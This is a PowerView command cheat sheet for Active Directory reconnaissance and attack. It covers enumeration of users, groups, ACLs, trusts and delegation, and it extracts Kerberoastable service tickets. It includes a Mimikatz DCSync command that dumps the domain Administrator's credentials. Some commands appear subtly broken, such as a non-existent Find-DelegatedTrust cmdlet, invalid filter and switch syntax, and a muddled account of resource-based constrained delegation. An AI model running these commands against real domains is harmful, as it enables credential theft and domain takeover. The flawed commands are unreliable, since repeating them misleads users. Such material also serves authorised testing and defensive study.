
### **Basic Commands for Enumeration**

#### **Get Current Domain Information**
Get basic information about the current domain (e.g., domain name, domain controllers):
```powershell
Get-Domain
```

#### **Get Information About a Specific Domain**
To query a specific domain (if not the current one):
```powershell
Get-Domain -Domain "example.com"
```

#### **Get Domain Controllers**
Enumerate all domain controllers within the domain:
```powershell
Get-DomainController
```

#### **Get Current User’s SID**
Retrieve the current user’s SID:
```powershell
(Get-DomainUser).objectsid
```

#### **Convert SID to User/Group Name**
To convert a **SID** into its associated AD object (like a username or group):
```powershell
ConvertFrom-SID S-1-5-21-123456789-123456789-123456789-500
```

#### **Convert User/Group Name to SID**
To get the **SID** of a specific user or group:
```powershell
Get-DomainUser -Identity "username" | Select-Object SamAccountName, ObjectSID
Get-DomainGroup -Identity "groupname" | Select-Object SamAccountName, ObjectSID
```

### **Enumerating AD Objects**

#### **Enumerate All Users**
List all users in the current domain:
```powershell
Get-DomainUser
```

#### **Enumerate Users in a Specific Group**
To get all users in a particular group (e.g., `Domain Admins`):
```powershell
Get-DomainGroupMember -Identity "Domain Admins"
```

#### **Enumerate All Groups**
List all groups in the domain:
```powershell
Get-DomainGroup
```

#### **List All Computers in the Domain**
Find all computers in the domain:
```powershell
Get-DomainComputer
```

#### **Find All High-Value Targets (Domain Admins, Enterprise Admins)**
To enumerate high-privileged users and groups:
```powershell
Get-DomainUser -AdminCount 1
Get-DomainGroup -AdminCount 1
```

#### **Enumerate Group Policy Objects (GPOs)**
List all GPOs in the domain:
```powershell
Get-DomainGPO
```

### **AD Permissions and ACL Enumeration**

#### **Enumerate Object ACLs (DACLs)**
Get the ACLs (DACLs) for a specific user, group, or object:
```powershell
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs
```

#### **Find Users with Write Permissions on a Group**
To find who has write permissions on the `Domain Admins` group:
```powershell
Get-ObjectAcl -ResolveGUIDs -Identity "Domain Admins" | ? { $_.ActiveDirectoryRights -match "WriteProperty" }
```

#### **Find Accounts with DCSync Privileges**
To find accounts that have DCSync privileges (i.e., users/groups with `Replicating Directory Changes`):
```powershell
Find-DelegatedTrust -ExtendedRights "Replicating Directory Changes"
```

#### **Find All Users with GenericAll Permissions on Computers**
This command lists users who have **GenericAll** permissions (full control) on computers, potentially allowing them to reset machine account passwords:
```powershell
Get-DomainObjectAcl -SearchBase "DC=example,DC=com" -RightsFilter "GenericAll" | ? { $_.ObjectType -eq "computer" }
```

### **Domain Enumeration & Trust Relationships**

#### **List All Domain Trusts**
If there are trust relationships between domains, you can list all of them:
```powershell
Get-DomainTrust
```

#### **List External Domain Trusts**
To specifically enumerate external domain trusts:
```powershell
Get-DomainTrust -Filter { TrustType -eq "External" }
```

#### **Enumerate Domains in a Forest**
Find all domains within the current forest:
```powershell
Get-ForestDomain
```

#### **Enumerate All Users with Password Not Expiring**
Identify users who have non-expiring passwords:
```powershell
Get-DomainUser -PwdNeverExpires
```

### **Local Administrator Enumeration**

#### **Find Local Administrators on All Computers**
To check which users have local admin privileges on computers across the domain:
```powershell
Invoke-EnumerateLocalAdmin -Verbose
```

### **Kerberos-related Enumeration**

#### **Find SPNs (Service Principal Names)**
SPNs can be used for **Kerberoasting** attacks to extract service tickets for offline cracking:
```powershell
Get-DomainUser -SPN
```

#### **Find All Kerberoastable Accounts**
This identifies users whose accounts are vulnerable to **Kerberoasting**:
```powershell
Get-DomainUser -SPN | Get-DomainSPNTicket
```

### **Piped PowerView Commands**

#### **Find Users with Unusual Group Memberships**
Combine `Get-DomainUser` with `Get-DomainGroupMember` to find users with unexpected group memberships:
```powershell
Get-DomainGroupMember -Identity "Domain Users" | Get-DomainUser
```

#### **Search for Users with Interesting Permissions**
Find users with interesting permissions (e.g., `GenericWrite`, `WriteOwner`):
```powershell
Get-DomainUser | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericWrite" }
```

#### **Find Machines with Unconstrained Delegation**
To find computers that are vulnerable due to unconstrained delegation, which can be used for privilege escalation:
```powershell
Get-DomainComputer -Unconstrained
```

#### **Enumerate Privileged Accounts with AdminCount Set**
Use this command to enumerate users that are members of privileged groups (e.g., Domain Admins, Enterprise Admins):
```powershell
Get-DomainUser -AdminCount 1
```

### **Advanced Usage and Scripts**

#### **Running DCSync Attack**
If the user has the `Replicating Directory Changes` privilege, they can run a **DCSync** attack using the following command:
```powershell
Invoke-Mimikatz -Command "lsadump::dcsync /domain:example.com /user:Administrator"
```

#### **Search for Interesting ACLs on Objects**
Search for any object with interesting permissions, like `GenericAll` or `WriteDACL`:
```powershell
Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll" -or $_.ActiveDirectoryRights -match "WriteDACL" }
```

### **Miscellaneous Useful Commands**

#### **Find AD Computers Running a Specific OS**
To find all computers running a particular version of Windows (e.g., Windows 10):
```powershell
Get-DomainComputer -OperatingSystem "Windows 10*"
```

#### **Find Disabled Accounts**
To list all disabled user accounts in AD:
```powershell
Get-DomainUser -Enabled $false
```

#### **Find Locked-Out Accounts**
To list all locked-out user accounts in AD:
```powershell
Get-DomainUser -LockedOut
```


### 1. **Unconstrained Delegation**
Unconstrained delegation allows a service to impersonate users for any service. It is configured by setting the `TRUSTED_FOR_DELEGATION` flag in the `userAccountControl` attribute.

#### **PowerView Command for Unconstrained Delegation:**
```powershell
# Enumerate computers with Unconstrained Delegation
Get-DomainComputer -Unconstrained | Select-Object Name, SamAccountName

# Enumerate users with Unconstrained Delegation
Get-DomainUser -Unconstrained | Select-Object Name, SamAccountName
```

### 2. **Constrained Delegation**
Constrained delegation allows a service to impersonate users, but only for specific services that are listed in the `msDS-AllowedToDelegateTo` attribute.

#### **PowerView Command for Constrained Delegation:**
```powershell
# Enumerate computers with Constrained Delegation
Get-DomainComputer -TrustedToAuth | Select-Object Name, SamAccountName, msDS-AllowedToDelegateTo

# Enumerate users with Constrained Delegation
Get-DomainUser -TrustedToAuth | Select-Object Name, SamAccountName, msDS-AllowedToDelegateTo
```

### 3. **Resource-Based Constrained Delegation (RBCD)**
RBCD allows a resource to specify which accounts can impersonate users for the resource, managed by the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. To find computers with RBCD enabled, you check for objects that have `GenericWrite` permissions on other computers.

#### **PowerView Command for RBCD:**
```powershell
# Enumerate computers with RBCD (Resource-Based Constrained Delegation)
Get-DomainComputer | 
    Get-ObjectAcl -ResolveGUIDs | 
    ForEach-Object {
        $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force
        $_
    } | 
    Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
```

```powershell
# Find computers with permissions allowing RBCD attack vectors
Get-DomainComputer | 
    Get-ObjectAcl -ResolveGUIDs | 
    ForEach-Object {
        # Convert SID to user/group name
        $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force
        $_
    } | 
    Where-Object {
        # Check for relevant permissions: GenericAll, GenericWrite, WriteDACL, WriteProperty
        $_.ActiveDirectoryRights -like '*GenericAll*' -or
        $_.ActiveDirectoryRights -like '*GenericWrite*' -or
        $_.ActiveDirectoryRights -like '*WriteDACL*' -or
        $_.ActiveDirectoryRights -like '*WriteProperty*'
    } | 
    Select-Object Identity, ObjectDN, ActiveDirectoryRights

```

